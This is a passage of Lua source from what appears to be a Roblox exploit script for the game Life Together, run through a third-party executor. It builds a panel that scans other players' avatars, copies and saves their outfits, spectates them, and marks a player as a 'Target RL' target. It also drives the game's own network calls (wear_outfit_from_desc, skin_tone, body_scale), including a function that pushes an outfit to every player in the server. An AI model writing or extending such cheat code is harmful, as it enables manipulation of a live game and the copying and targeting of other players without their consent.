            viewBtn.Text = "Unview"
            viewBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            viewBtn.Text = "View"
            viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        end
        viewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        viewBtn.Font = Enum.Font.SourceSansBold
        viewBtn.TextSize = 11
        viewBtn.BorderSizePixel = 0
        viewBtn.LayoutOrder = 5
        viewBtn.Parent = actionLayout

      
        local isWl = massWhitelist[targetPlayer.Name]
        local wlBtn = Instance.new("TextButton")
        wlBtn.Text = isWl and "Safe" or "Whitelist"
        wlBtn.BackgroundColor3 = isWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        wlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        wlBtn.Font = Enum.Font.SourceSansBold
        wlBtn.TextSize = 11
        wlBtn.BorderSizePixel = 0
        wlBtn.LayoutOrder = 6
        wlBtn.Parent = actionLayout
 -- ==========================================

              -- ==========================================
        -- ROW 2: TARGET RL BUTTON (NEW!)
        -- ==========================================
        local targetRlBtn = Instance.new("TextButton")
        if autoRLTarget == targetPlayer then
            targetRlBtn.Text = "Untarget RL"
            targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50) -- Red when active
        else
            targetRlBtn.Text = "Target RL"
            targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50) -- Orange when inactive
        end
        targetRlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        targetRlBtn.Font = Enum.Font.SourceSansBold
        targetRlBtn.TextSize = 11
        targetRlBtn.BorderSizePixel = 0
        targetRlBtn.LayoutOrder = 7
        targetRlBtn.Parent = actionLayout

     -- ==========================================
        -- LOGIC CONNECTIONS
        -- ==========================================
   
         targetRlBtn.MouseButton1Click:Connect(function()
            if autoRLTarget == targetPlayer then
                -- Turn it OFF
                autoRLTarget = nil
                targetRlBtn.Text = "Target RL"
                targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
            else
                -- Turn it ON
                autoRLTarget = targetPlayer
                targetRlBtn.Text = "Untarget RL"
                targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)
----     
      tryShareBtn.MouseButton1Click:Connect(function()
          shareOutfitToAll(outfitData, tryShareBtn, "Share All", Color3.fromRGB(200, 100, 200), targetPlayer)
        end)

          -- [NEW CONNECTIONS FOR VIEW & WHITELIST]
        viewBtn.MouseButton1Click:Connect(function()
            if isViewing and selectedSpectateTarget == targetPlayer then
                -- If we are already viewing them, stop viewing and revert to blue
                stopView()
                viewBtn.Text = "View"
                viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
            else
                -- If we are NOT viewing them, start viewing and turn red
                startView(targetPlayer)
                viewBtn.Text = "Unview"
                viewBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)

        wlBtn.MouseButton1Click:Connect(function()
            massWhitelist[targetPlayer.Name] = not massWhitelist[targetPlayer.Name]
            local nowWl = massWhitelist[targetPlayer.Name]
            wlBtn.Text = nowWl and "Safe" or "Whitelist"
            wlBtn.BackgroundColor3 = nowWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        end)


        -- Action Connections
        copyBtn.MouseButton1Click:Connect(function()
            setclipboard(rawBox.Text)
            copyBtn.Text = "Copied!"
            task.wait(2)
            copyBtn.Text = "Copy JSON"
        end)

        saveBtn.MouseButton1Click:Connect(function()
            if writefile then
                local folder = "lifetogether_admin_savedoutfits"
                if makefolder and not isfolder(folder) then
                    pcall(makefolder, folder)
                end
                
                local baseName = targetPlayer.Name .. "_Scanned"
                local fileName = folder .. "/" .. baseName .. ".json"
                local counter = 1
                
                while isfile(fileName) do
                    fileName = folder .. "/" .. baseName .. "_" .. tostring(counter) .. ".json"
                    counter = counter + 1
                end

                local s, e = pcall(function()
                    writefile(fileName, rawBox.Text)
                end)
                if s then
                    saveBtn.Text = "Saved!"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                else
                    saveBtn.Text = "Error Saving"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                end
            else
                saveBtn.Text = "Not Supported"
                saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
            task.wait(2)
            saveBtn.Text = "Save Outfit"
            saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)

        wearBtn.MouseButton1Click:Connect(function()
            local payload = buildBatchPayload(outfitData)
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)

            if not Send then
                wearBtn.Text = "Loading Net..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
                -- Silently fetch and execute the game's network API so this script runs standalone
             end

            if Send then
                wearBtn.Text = "Applying..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
                
                task.spawn(function()
                    for i = 1, 3 do
                        Send("wear_outfit_from_desc", payload)
                        task.wait(0.1)
                    end
                    task.wait(0.2)
                    
                    if outfitData.SkinTone then
                        pcall(function()
                            local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3])
                            for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end
                        end)
                        task.wait(0.2)
                    end
                    
                               --      if outfitData.Age and Get then
                     --   pcall(function()
                        --    Get("age", tostring(outfitData.Age)) 
                        --   end)
            
                   -- end

                    
                    if outfitData.HeightScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.1) end
                        end)
                    end
                    if outfitData.WidthScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.1) end
                        end)
                    end
------
                            if outfitData.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.1) end end
if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.1) end end


                    wearBtn.Text = "Applied!"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                    task.wait(2)
                    wearBtn.Text = "Try On (Server)"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
                end)
            else
                wearBtn.Text = "Net Error"
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                task.wait(2)
                wearBtn.Text = "Try On (Server)"
                wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
            end
        end)
    end

    if description.Shirt ~= 0 then createDetailedAssetCard("Classic Shirt", description.Shirt, "HumanoidDesc.Shirt") end
    if description.Pants ~= 0 then createDetailedAssetCard("Classic Pants", description.Pants, "HumanoidDesc.Pants") end
    if description.GraphicTShirt ~= 0 then createDetailedAssetCard("T-Shirt Graphic", description.GraphicTShirt, "HumanoidDesc.GraphicTShirt") end
    if description.Face ~= 0 then createDetailedAssetCard("Face Texture", description.Face, "HumanoidDesc.Face") end

    local bodyParts = {
        "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"
    }
    for _, part in ipairs(bodyParts) do
        local partId = tonumber(description[part]) or 0
        if partId ~= 0 then
            createDetailedAssetCard("Body: " .. part, partId, "HumanoidDesc." .. part)
        end
    end

    local animations = {
        "IdleAnimation", "RunAnimation", "WalkAnimation", "JumpAnimation",
        "ClimbAnimation", "FallAnimation", "SwimAnimation"
    }
    for _, anim in ipairs(animations) do
        local animId = tonumber(description[anim]) or 0
        if animId ~= 0 then
            createDetailedAssetCard("Anim: " .. anim:gsub("Animation", ""), animId, "HumanoidDesc." .. anim)
        end
    end

    local accessories = description:GetAccessories(true)
    for _, acc in pairs(accessories) do
        local accType = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
        local label = acc.IsLayered and ("Layered " .. accType) or accType
        createDetailedAssetCard(label, acc.AssetId, "HumanoidDesc." .. accType)
    end
end
populateSavedOutfits = function()
    -- Clear current list
    for _, child in pairs(SavedScroll:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end

    local folderName = "lifetogether_admin_savedoutfits"
    if not isfolder or not isfolder(folderName) then return end

       -- 1. Collect all valid outfits into a table first
    local outfitsList = {}
    
    for _, file in ipairs(listfiles(folderName)) do
        if file:match("%.json$") then
            local name = file:match("([^/\\]+)%.json$")
            local ok, content = pcall(readfile, file)
            
            if ok and content and #content > 0 then
                local success, data = pcall(function() return HttpService:JSONDecode(content) end)
                if success and type(data) == "table" then
                    local isScanned = string.find(name, "_Scanned") ~= nil
                    -- Extract the time we saved earlier (Default to 0 for older saved files)
                    local savedTime = tonumber(data.SavedAtTime) or 0
                    
                    table.insert(outfitsList, {
                        name = name,
                        data = data,
                        file = file,
                        isScanned = isScanned,
                        time = savedTime
                    })
                end
            end
        end
    end

    -- 2. Sort the table: Scanned outfits first, then Latest to Oldest
    table.sort(outfitsList, function(a, b)
        -- Keep scanned files pinned to the very top
        if a.isScanned and not b.isScanned then
            return true
        elseif not a.isScanned and b.isScanned then
            return false
        else
            -- If neither is scanned (or both are), sort by newest time first
            if a.time ~= b.time then
                return a.time > b.time
            else
                -- Fallback to alphabetical if they have the exact same time (or are old saves without a time)
                return string.lower(a.name) < string.lower(b.name)
            end
        end
    end)

    -- 3. Build the UI in the sorted order
    for _, outfitInfo in ipairs(outfitsList) do
        local name = outfitInfo.name
        local data = outfitInfo.data
        local file = outfitInfo.file

        local Entry = Instance.new("Frame")
        Entry.Size = UDim2.new(1, -5, 0, 40)
        Entry.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        Entry.BorderSizePixel = 0
        Entry.Parent = SavedScroll

            -- NEW: Mini 3D Viewport Thumbnail
        local SmallViewport = Instance.new("ViewportFrame")
        SmallViewport.Size = UDim2.new(0, 30, 0, 30)
        SmallViewport.Position = UDim2.new(0, 5, 0, 5)
        SmallViewport.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
        SmallViewport.BorderSizePixel = 0
        SmallViewport.Parent = Entry

        -- [NEW] WorldModel for Layered Clothing deformation in thumbnails
        local smallWorldModel = Instance.new("WorldModel")
        smallWorldModel.Parent = SmallViewport

        -- Background thread to build the avatar and take a picture
        task.spawn(function()
            local desc = Instance.new("HumanoidDescription")
            desc.Shirt = data.Shirt or 0
            desc.Pants = data.Pants or 0
            desc.GraphicTShirt = data.GraphicTShirt or 0
            desc.Face = data.Face or 0
            desc.Head = data.Head or 0

            if data.SkinTone then
                local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3])
                desc.HeadColor = c
                desc.TorsoColor = c
                desc.LeftArmColor = c
                desc.RightArmColor = c
                desc.LeftLegColor = c
                desc.RightLegColor = c
            end

            -- Safely attach accessories by grouping their types
            if data.Accessories then
                local accGroups = {}
                for _, acc in pairs(data.Accessories) do
                    local typeName = acc.AccessoryType
                    if not string.find(typeName, "Accessory") then
                        typeName = typeName .. "Accessory"
                    end
                    
                    if accGroups[typeName] then
                        accGroups[typeName] = accGroups[typeName] .. "," .. tostring(acc.AssetId)
                    else
                        accGroups[typeName] = tostring(acc.AssetId)
                    end
                end
                for prop, val in pairs(accGroups) do
                    pcall(function() desc[prop] = val end)
                end
            end

            -- Create dummy model
            local dummy
            local success, err = pcall(function()
                dummy = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R15)
            end)

            -- Fallback
            if not success or not dummy then
                pcall(function()
                    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                    local oldArch = myChar.Archivable
                    myChar.Archivable = true
                    dummy = myChar:Clone()
                    myChar.Archivable = oldArch
                    
                    local hum = dummy:FindFirstChildOfClass("Humanoid")
                    if hum then
                        hum:ApplyDescription(desc)
                    end
                end)
            end

            if dummy then
                for _, v in pairs(dummy:GetDescendants()) do
                    if v:IsA("Script") or v:IsA("LocalScript") then v:Destroy() end
                end

                -- Center dummy and parent to WorldModel
                dummy:PivotTo(CFrame.new(0, 0, 0))
                dummy.Parent = smallWorldModel
    
                local camera = Instance.new("Camera")
                camera.Parent = SmallViewport
    
                local hrp = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("UpperTorso") or dummy:FindFirstChild("Torso")
                if hrp then
                    camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -5.5) * CFrame.Angles(0, math.pi, 0)
                    camera.Focus = hrp.CFrame
                end
                
                SmallViewport.CurrentCamera = camera
            end
        end)

        -- Text Box shifted over to make room for the picture
        local NameBox = Instance.new("TextBox")
        NameBox.Size = UDim2.new(0.35, -30, 1, 0)
        NameBox.Position = UDim2.new(0, 40, 0, 0)
        NameBox.BackgroundTransparency = 1
        NameBox.Text = name
        
        if outfitInfo.isScanned then
            NameBox.TextColor3 = Color3.fromRGB(0, 255, 200)
        else
            NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
        
        NameBox.Font = Enum.Font.SourceSansBold
        NameBox.TextSize = 14
        NameBox.TextXAlignment = Enum.TextXAlignment.Left
        NameBox.ClearTextOnFocus = false
        NameBox.Parent = Entry

      local WearBtn = Instance.new("TextButton")
        WearBtn.Size = UDim2.new(0.14, 0, 0, 26)
        WearBtn.Position = UDim2.new(0.38, 0, 0.5, -13)
        WearBtn.Text = "Wear"
        WearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        WearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        WearBtn.Font = Enum.Font.SourceSansBold
        WearBtn.TextSize = 11
        WearBtn.BorderSizePixel = 0
        WearBtn.Parent = Entry

        local RenameBtn = Instance.new("TextButton")
        RenameBtn.Size = UDim2.new(0.16, 0, 0, 26)
        RenameBtn.Position = UDim2.new(0.53, 0, 0.5, -13)
        RenameBtn.Text = "Rename"
        RenameBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        RenameBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        RenameBtn.Font = Enum.Font.SourceSansBold
        RenameBtn.TextSize = 11
        RenameBtn.BorderSizePixel = 0
        RenameBtn.Parent = Entry

        local DeleteBtn = Instance.new("TextButton")
        DeleteBtn.Size = UDim2.new(0.12, 0, 0, 26)
        DeleteBtn.Position = UDim2.new(0.70, 0, 0.5, -13)
        DeleteBtn.Text = "Del"
        DeleteBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        DeleteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        DeleteBtn.Font = Enum.Font.SourceSansBold
        DeleteBtn.TextSize = 11
        DeleteBtn.BorderSizePixel = 0
        DeleteBtn.Parent = Entry

        -- NEW: Share All Button for Saved Outfits
        local ShareBtn = Instance.new("TextButton")
        ShareBtn.Size = UDim2.new(0.16, 0, 0, 26)
        ShareBtn.Position = UDim2.new(0.83, 0, 0.5, -13)
        ShareBtn.Text = "All Share"
        ShareBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
        ShareBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        ShareBtn.Font = Enum.Font.SourceSansBold
        ShareBtn.TextSize = 11
        ShareBtn.BorderSizePixel = 0
        ShareBtn.Parent = Entry

             -- [UPDATED] Share All Logic for Saved Outfit
        ShareBtn.MouseButton1Click:Connect(function()
            -- Attempt to find if the person we saved this from is currently in the server
            local excludedTarget = nil
            for _, p in ipairs(Players:GetPlayers()) do
                if string.find(name, p.Name) then -- Checks if their name is in the save file
                    excludedTarget = p
                    break
                end
            end
            
            shareOutfitToAll(data, ShareBtn, "Share All", Color3.fromRGB(200, 100, 200), excludedTarget)
        end)

        -- Wear Logic
        WearBtn.MouseButton1Click:Connect(function()
            WearBtn.Text = "..."
            local payload = buildBatchPayload(data)
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
            
            if Send then
                task.spawn(function()
                    for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
                    task.wait(0.2)
                    if data.SkinTone then pcall(function() local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]) for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end end) end
               --     if data.Age and Get then pcall(function() Get("age", tostring(data.Age)) end) end
                    if data.HeightScale then for i=1,3 do Send("body_scale", "HeightScale", data.HeightScale * 100) task.wait(0.1) end end
                    if data.WidthScale then for i=1,3 do Send("body_scale", "WidthScale", data.WidthScale * 100) task.wait(0.1) end end
                            
 if data.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", data.BodyTypeScale * 100) task.wait(0.1) end end
 if data.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", data.ProportionScale * 100) task.wait(0.1) end end

                    WearBtn.Text = "Worn!"
                    task.wait(1.5)
                    WearBtn.Text = "Wear"
                end)
            end
        end)

        -- Rename Logic
        RenameBtn.MouseButton1Click:Connect(function()
            NameBox:CaptureFocus()
        end)
        NameBox.FocusLost:Connect(function()
            local newName = NameBox.Text:gsub("%s+", "")
            if newName ~= "" and newName ~= name then
                local oldPath = folderName .. "/" .. name .. ".json"
                local newPath = folderName .. "/" .. newName .. ".json"
                if not isfile(newPath) then
                    pcall(function()
                        writefile(newPath, HttpService:JSONEncode(data))
                        if isfile(oldPath) then delfile(oldPath) end
                    end)
                end
            end
            populateSavedOutfits()
        end)

        -- Delete Logic
        DeleteBtn.MouseButton1Click:Connect(function()
            pcall(function()
                if isfile(file) then delfile(file) end
            end)
            populateSavedOutfits()
        end)
    end
end


----
local function populatePlayerList()
    for _, child in pairs(PlayerScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    for _, player in pairs(Players:GetPlayers()) do
        local PlayerBtn = Instance.new("TextButton")
        PlayerBtn.Size = UDim2.new(1, -5, 0, 50)
        PlayerBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        PlayerBtn.BorderSizePixel = 0
        PlayerBtn.Text = ""
        PlayerBtn.Parent = PlayerScroll

        local SmallViewport = Instance.new("ViewportFrame")
        SmallViewport.Size = UDim2.new(0, 40, 0, 40)
        SmallViewport.Position = UDim2.new(0, 5, 0, 5)
        SmallViewport.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
        SmallViewport.BorderSizePixel = 0
        SmallViewport.Parent = PlayerBtn

        local DisplayName = Instance.new("TextLabel")
        DisplayName.Size = UDim2.new(1, -60, 0, 20)
        DisplayName.Position = UDim2.new(0, 55, 0, 5)
        DisplayName.Text = player.DisplayName
        DisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)
        DisplayName.Font = Enum.Font.SourceSansBold
        DisplayName.TextSize = 16
        DisplayName.TextXAlignment = Enum.TextXAlignment.Left
        DisplayName.BackgroundTransparency = 1
        DisplayName.Parent = PlayerBtn

        local Username = Instance.new("TextLabel")
        Username.Size = UDim2.new(1, -60, 0, 20)
        Username.Position = UDim2.new(0, 55, 0, 25)
        Username.Text = "@" .. player.Name
        Username.TextColor3 = Color3.fromRGB(150, 150, 150)
        Username.Font = Enum.Font.SourceSans
        Username.TextSize = 14
        Username.TextXAlignment = Enum.TextXAlignment.Left
        Username.BackgroundTransparency = 1
        Username.Parent = PlayerBtn

        -- [FIXED] Smart State Capture Logic
        local cachedDescription = nil
        
        task.spawn(function()
            -- 1. Wait for their 3D character to actually exist in the world
            local char = player.Character or player.CharacterAdded:Wait()
            
            -- 2. Wait for Roblox to finish dressing them (prevents blank/bald captures!)
            if not player:HasAppearanceLoaded() then
                player.CharacterAppearanceLoaded:Wait()
            end

            -- 3. Now that they are fully loaded, permanently lock in the snapshot!
            local hum = char:WaitForChild("Humanoid", 5)
            if hum then
                pcall(function()
                    cachedDescription = hum:GetAppliedDescription()
                end)
            end

            -- 4. Build the thumbnail picture safely
            local oldArchivable = char.Archivable
            char.Archivable = true
            local headClone = char:Clone()
            char.Archivable = oldArchivable

            if headClone then
                headClone.Parent = SmallViewport
                local camera = Instance.new("Camera")
                camera.Parent = SmallViewport
                
                local head = headClone:FindFirstChild("Head")
                if head then
                    camera.CFrame = head.CFrame * CFrame.new(0, 0, -2.5) * CFrame.Angles(0, math.pi, 0)
                    camera.Focus = head.CFrame
                end
                SmallViewport.CurrentCamera = camera
            end
        end)
        
        PlayerBtn.MouseButton1Click:Connect(function()
            deepScanPlayerOutfit(player, cachedDescription)
        end)
    end
end
-----
      
   

-- Initialize
RefreshBtn.MouseButton1Click:Connect(populatePlayerList)
populatePlayerList()